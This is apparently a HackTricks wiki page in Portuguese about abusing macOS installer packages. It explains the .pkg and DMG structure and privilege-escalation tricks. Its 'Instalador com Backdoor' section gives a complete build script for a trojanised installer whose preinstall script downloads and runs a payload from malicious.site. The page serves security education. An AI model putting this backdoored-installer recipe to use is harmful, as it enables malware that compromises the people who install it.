# macOS Installers Abuse

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Pkg Basic Information

Um **pacote de instalador** do macOS (também conhecido como arquivo `.pkg`) é um formato de arquivo usado pelo macOS para **distribuir software**. Esses arquivos são como uma **caixa que contém tudo o que um software** precisa para ser instalado e executado corretamente.

O arquivo do pacote em si é um arquivo compactado que contém uma **hierarquia de arquivos e diretórios que serão instalados no computador de destino**. Ele também pode incluir **scripts** para realizar tarefas antes e depois da instalação, como configurar arquivos de configuração ou limpar versões antigas do software.

### Hierarchy

<figure><img src="../../../.gitbook/assets/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

* **Distribuição (xml)**: Personalizações (título, texto de boas-vindas…) e verificações de script/instalação
* **PackageInfo (xml)**: Informações, requisitos de instalação, local de instalação, caminhos para scripts a serem executados
* **Bill of materials (bom)**: Lista de arquivos a serem instalados, atualizados ou removidos com permissões de arquivo
* **Payload (arquivo CPIO comprimido com gzip)**: Arquivos a serem instalados na `install-location` do PackageInfo
* **Scripts (arquivo CPIO comprimido com gzip)**: Scripts de pré e pós-instalação e mais recursos extraídos para um diretório temporário para execução.

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files ina. more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Para visualizar o conteúdo do instalador sem descompactá-lo manualmente, você também pode usar a ferramenta gratuita [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

## Informações Básicas sobre DMG

Arquivos DMG, ou Imagens de Disco da Apple, são um formato de arquivo usado pelo macOS da Apple para imagens de disco. Um arquivo DMG é essencialmente uma **imagem de disco montável** (contém seu próprio sistema de arquivos) que contém dados brutos em bloco, tipicamente comprimidos e às vezes criptografados. Quando você abre um arquivo DMG, o macOS **o monta como se fosse um disco físico**, permitindo que você acesse seu conteúdo.

{% hint style="danger" %}
Observe que instaladores **`.dmg`** suportam **tantos formatos** que, no passado, alguns deles contendo vulnerabilidades foram abusados para obter **execução de código no kernel**.
{% endhint %}

### Hierarquia

<figure><img src="../../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>

A hierarquia de um arquivo DMG pode ser diferente com base no conteúdo. No entanto, para DMGs de aplicativos, geralmente segue esta estrutura:

* Nível Superior: Este é a raiz da imagem de disco. Frequentemente contém o aplicativo e possivelmente um link para a pasta Aplicativos.
* Aplicativo (.app): Este é o aplicativo real. No macOS, um aplicativo é tipicamente um pacote que contém muitos arquivos e pastas individuais que compõem o aplicativo.
* Link de Aplicativos: Este é um atalho para a pasta Aplicativos no macOS. O objetivo disso é facilitar a instalação do aplicativo. Você pode arrastar o arquivo .app para este atalho para instalar o app.

## Privesc via abuso de pkg

### Execução de diretórios públicos

Se um script de pré ou pós-instalação estiver, por exemplo, executando de **`/var/tmp/Installerutil`**, um atacante poderia controlar esse script para escalar privilégios sempre que ele for executado. Ou outro exemplo semelhante:

<figure><img src="../../../.gitbook/assets/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Esta é uma [função pública](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) que vários instaladores e atualizadores chamarão para **executar algo como root**. Esta função aceita o **caminho** do **arquivo** a ser **executado** como parâmetro; no entanto, se um atacante puder **modificar** este arquivo, ele poderá **abusar** de sua execução com root para **escalar privilégios**.
```bash
# Breakpoint in the function to check wich file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this missconfig
```
Para mais informações, confira esta palestra: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Execução por montagem

Se um instalador escrever em `/tmp/fixedname/bla/bla`, é possível **criar um mount** sobre `/tmp/fixedname` sem proprietários, para que você possa **modificar qualquer arquivo durante a instalação** para abusar do processo de instalação.

Um exemplo disso é **CVE-2021-26089**, que conseguiu **sobrescrever um script periódico** para obter execução como root. Para mais informações, dê uma olhada na palestra: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg como malware

### Payload Vazio

É possível gerar apenas um arquivo **`.pkg`** com **scripts de pré e pós-instalação** sem nenhum payload real além do malware dentro dos scripts.

### JS no xml de Distribuição

É possível adicionar tags **`<script>`** no arquivo **xml de distribuição** do pacote e esse código será executado e pode **executar comandos** usando **`system.run`**:

<figure><img src="../../../.gitbook/assets/image (1043).png" alt=""><figcaption></figcaption></figure>

### Instalador com Backdoor

Instalador malicioso usando um script e código JS dentro do dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options customize="allow" require-scripts="false"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Buil final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Referências

* [**DEF CON 27 - Desempacotando Pkgs Um Olhar Dentro dos Pacotes de Instalador do Macos e Falhas de Segurança Comuns**](https://www.youtube.com/watch?v=iASSG0\_zobQ)
* [**OBTS v4.0: "O Mundo Selvagem dos Instaladores do macOS" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
* [**DEF CON 27 - Desempacotando Pkgs Um Olhar Dentro dos Pacotes de Instalador do MacOS**](https://www.youtube.com/watch?v=kCXhIYtODBg)
* [https://redteamrecipe.com/macos-red-teaming?utm\_source=pocket\_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm\_source=pocket\_shared#heading-exploiting-installer-packages)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
